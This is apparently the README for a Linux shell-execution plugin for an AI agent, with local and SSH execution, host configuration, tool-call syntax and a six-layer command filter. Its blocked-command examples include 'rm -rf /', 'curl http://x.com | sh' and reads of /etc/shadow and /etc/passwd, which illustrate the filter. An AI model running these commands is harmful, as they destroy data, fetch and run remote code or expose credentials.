# LinuxShellExecutor

六层安全防护的 Linux Shell 命令执行器，专为 VCP Agent 设计。

## 🆕 v0.2.0 新功能

- ✅ **多主机 SSH 远程执行** - 支持配置多台 Linux 服务器
- ✅ **密钥/密码认证** - 支持 SSH 私钥和密码两种认证方式
- ✅ **跳板机支持** - 支持通过跳板机访问内网服务器
- ✅ **连接池管理** - 自动管理 SSH 连接，支持会话复用

## 架构概览

```
┌─────────────────────────────────────────────────────────────┐
│                    LinuxShellExecutor v0.2.0                │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────────┐   │
│  │                   主机管理器                         │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐             │   │
│  │  │ local   │  │dev-server│ │prod-srv │  ...        │   │
│  │  │ 本地    │  │ SSH Key │  │ SSH Key │             │   │
│  │  └─────────┘  └─────────┘  └─────────┘             │   │
│  └─────────────────────────────────────────────────────┘   │
│                          ↓                                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              六层安全防护                            │   │
│  │  1.黑名单 → 2.白名单 → 3.AST → 4.沙箱 → 5.限制 → 6.审计│   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

## 安装依赖

```bash
cd Plugin/LinuxShellExecutor
npm install ssh2 dotenv
```

## 系统依赖（本地沙箱执行）

```bash
# Bubblewrap（推荐，最轻量）
apt install bubblewrap

# 或 Firejail
apt install firejail

# 或 Docker
apt install docker.io
```

## 配置说明

### 1. 主机配置 (hosts.json)

```json
{
    "hosts": {
        "local": {
            "name": "本地执行",
            "type": "local",
            "enabled": true,
            "securityLevel": "standard"
        },
        "dev-server": {
            "name": "开发服务器",
            "type": "ssh",
            "enabled": true,
            "host": "192.168.1.100",
            "port": 22,
            "username": "developer",
            "authMethod": "key",
            "privateKeyPath": "~/.ssh/id_rsa",
            "securityLevel": "standard"
        },
        "prod-server": {
            "name": "生产服务器",
            "type": "ssh",
            "enabled": true,
            "host": "10.0.0.10",
            "port": 22,
            "username": "ops",
            "authMethod": "key",
            "privateKeyPath": "/path/to/prod_key",
            "securityLevel": "high",
            "jumpHost": "bastion"
        }
    },
    "defaultHost": "local",
    "globalSettings": {
        "maxConcurrentConnections": 5,
        "connectionPoolSize": 10,
        "defaultTimeout": 30000,
        "retryAttempts": 3,
        "retryDelay": 1000,
        "logConnections": true
    }
}
```

### hosts.json 字段说明

#### 主机配置字段 (hosts.{hostId})

| 字段 | 类型 | 必需 | 默认值 | 说明 |
|------|------|------|--------|------|
| `name` | string | ✓ | - | 主机显示名称 |
| `description` | string | | - | 主机描述信息 |
| `type` | string | ✓ | - | 主机类型：`local`（本地）或 `ssh`（远程） |
| `enabled` | boolean | ✓ | - | 是否启用该主机 |
| `host` | string | SSH必需 | - | SSH 主机地址（IP 或域名） |
| `port` | number | | 22 | SSH 端口号 |
| `username` | string | SSH必需 | - | SSH 登录用户名 |
| `authMethod` | string | SSH必需 | - | 认证方式：`key`（密钥）或 `password`（密码） |
| `privateKeyPath` | string | 密钥认证必需 | - | SSH 私钥文件路径，支持 `~` 展开 |
| `passphrase` | string | | "" | 私钥密码短语（如果私钥有密码保护） |
| `password` | string | 密码认证必需 | - | SSH 登录密码（不推荐使用） |
| `securityLevel` | string | | "standard" | 安全等级：`basic`/`standard`/`high`/`maximum` |
| `timeout` | number | | 30000 | 连接超时时间（毫秒） |
| `keepAliveInterval` | number | | 10000 | 心跳保活间隔（毫秒） |
| `jumpHost` | string | | null | 跳板机主机ID（用于访问内网服务器） |
| `tags` | array | | [] | 主机标签，用于分类和筛选 |

#### 全局配置字段 (globalSettings)

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `maxConcurrentConnections` | number | 5 | 最大并发连接数 |
| `connectionPoolSize` | number | 10 | 连接池大小 |
| `defaultTimeout` | number | 30000 | 默认超时时间（毫秒） |
| `retryAttempts` | number | 3 | 连接失败重试次数 |
| `retryDelay` | number | 1000 | 重试间隔（毫秒） |
| `logConnections` | boolean | true | 是否记录连接日志 |

#### 顶层配置字段

| 字段 | 类型 | 说明 |
|------|------|------|
| `version` | string | 配置文件版本号 |
| `description` | string | 配置文件描述 |
| `hosts` | object | 主机配置对象，key 为主机ID |
| `defaultHost` | string | 默认主机ID，未指定 hostId 时使用 |
| `globalSettings` | object | 全局设置 |

### 2. 认证方式

#### SSH 密钥认证（推荐）

```json
{
    "authMethod": "key",
    "privateKeyPath": "~/.ssh/id_rsa",
    "passphrase": ""
}
```

#### 密码认证（不推荐）

```json
{
    "authMethod": "password",
    "password": "your-password"
}
```

### 3. 跳板机配置

```json
{
    "bastion": {
        "name": "跳板机",
        "type": "ssh",
        "host": "bastion.example.com",
        "username": "jump",
        "authMethod": "key",
        "privateKeyPath": "~/.ssh/bastion_key"
    },
    "internal-server": {
        "name": "内网服务器",
        "type": "ssh",
        "host": "192.168.100.50",
        "username": "admin",
        "authMethod": "key",
        "privateKeyPath": "~/.ssh/internal_key",
        "jumpHost": "bastion"
    }
}
```

## 调用方式

### 基本命令执行

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
command:「始」ls -la /tmp「末」
<<<[END_TOOL_REQUEST]>>>
```

### 指定远程主机

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
command:「始」df -h「末」,
hostId:「始」dev-server「末」
<<<[END_TOOL_REQUEST]>>>
```

### 列出所有主机

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
action:「始」listHosts「末」
<<<[END_TOOL_REQUEST]>>>
```

### 测试主机连接

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
action:「始」testConnection「末」,
hostId:「始」dev-server「末」
<<<[END_TOOL_REQUEST]>>>
```

### 获取连接状态

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
action:「始」getStatus「末」
<<<[END_TOOL_REQUEST]>>>
```

## 参数说明

| 参数 | 类型 | 必需 | 说明 |
|------|------|------|------|
| `command` | string | ✓* | 要执行的 Shell 命令 |
| `action` | string | ✓* | 特殊操作：listHosts/testConnection/getStatus |
| `hostId` | string | | 目标主机ID，默认 'local' |
| `timeout` | number | | 超时时间（毫秒），默认 30000 |
| `securityLevel` | string | | 安全等级：basic/standard/high/maximum |

*注：command 和 action 二选一

## 返回格式

### 命令执行成功

```json
{
    "status": "success",
    "result": "命令输出内容",
    "stderr": "错误输出（如有）",
    "code": 0,
    "duration": 123,
    "hostId": "dev-server",
    "securityLevel": "standard",
    "executionType": "ssh"
}
```

### 列出主机

```json
{
    "status": "success",
    "hosts": [
        {
            "id": "local",
            "name": "本地执行",
            "type": "local",
            "enabled": true
        },
        {
            "id": "dev-server",
            "name": "开发服务器",
            "type": "ssh",
            "enabled": true,
            "host": "192.168.1.100"
        }
    ]
}
```

### 连接测试

```json
{
    "status": "success",
    "success": true,
    "hostId": "dev-server",
    "latency": 45,
    "message": "连接成功，延迟 45ms"
}
```

## 安全等级

| 等级 | 启用层 | 适用场景 |
|------|--------|----------|
| `basic` | 黑名单 | 内部可信环境 |
| `standard` | 黑名单 + 白名单 + 沙箱 | 一般生产环境（默认） |
| `high` | 黑名单 + 白名单 + AST + 沙箱 | 敏感数据环境 |
| `maximum` | 全部六层 | 公开 API / 多租户 |

## 白名单命令列表

| 命令 | 说明 | 允许的参数 |
|------|------|-----------|
| `ls` | 列出目录 | -l, -a, -la, -lh, -R, -t, -S |
| `cat` | 查看文件 | -n, -b, -s |
| `grep` | 文本搜索 | -i, -n, -r, -v, -c, -l, -E, -w |
| `find` | 查找文件 | -name, -type, -size, -mtime, -maxdepth |
| `ps` | 查看进程 | aux, -ef, -u, --forest |
| `df` | 磁盘使用 | -h, -T, -i |
| `free` | 内存使用 | -m, -h, -g |
| `head` | 文件头部 | -n, -c |
| `tail` | 文件尾部 | -n, -f, -c |
| `wc` | 统计 | -l, -w, -c, -m |
| `echo` | 输出文本 | -n, -e |
| `pwd` | 当前目录 | - |
| `whoami` | 当前用户 | - |
| `date` | 日期时间 | +%Y-%m-%d, +%H:%M:%S |
| `uname` | 系统信息 | -a, -r, -m, -n |
| `hostname` | 主机名 | -f, -i |
| `uptime` | 运行时间 | -p, -s |
| `id` | 用户ID | -u, -g, -n |
| `env` | 环境变量 | - |
| `which` | 命令路径 | -a |
| `file` | 文件类型 | -b, -i |
| `stat` | 文件状态 | -c |
| `du` | 目录大小 | -h, -s, -a, -c |
| `sort` | 排序 | -n, -r, -u, -k, -t |
| `uniq` | 去重 | -c, -d, -u |
| `cut` | 字段切割 | -d, -f, -c |
| `awk` | 文本处理 | -F |
| `sed` | 流编辑器 | -n, -e |

## 安全检测示例

### 被拦截的危险命令

```bash
# 黑名单拦截
rm -rf /                    # ❌ 匹配禁止模式
poweroff                    # ❌ 精确匹配禁止命令

# 白名单拦截
apt install vim             # ❌ apt 不在白名单
ls /etc/shadow              # ❌ 路径在拒绝列表

# AST 分析拦截
echo $(cat /etc/passwd)     # ❌ 命令注入
curl http://x.com | sh      # ❌ 网络外泄
sudo ls                     # ❌ 提权尝试
```

### 允许执行的安全命令

```bash
ls -la /tmp                 # ✓
cat /var/log/syslog         # ✓
grep -r "error" /var/log    # ✓
ps aux                      # ✓
df -h                       # ✓
```

## 目录结构

```
Plugin/LinuxShellExecutor/
├── LinuxShellExecutor.js    # 主执行器
├── plugin-manifest.json     # 插件配置
├── config.env               # 安全策略配置
├── whitelist.json           # 白名单配置
├── hosts.json               # 主机配置
├── README.md                # 使用文档
├── ssh/
│   └── SSHManager.js        # SSH 连接管理器
└── logs/
    └── audit/               # 审计日志目录
```

## 版本历史

- **v0.2.0** - 新增多主机 SSH 远程执行、密钥认证、跳板机支持
- **v0.1.0** - 初始版本，实现六层安全架构

## 许可证

MIT License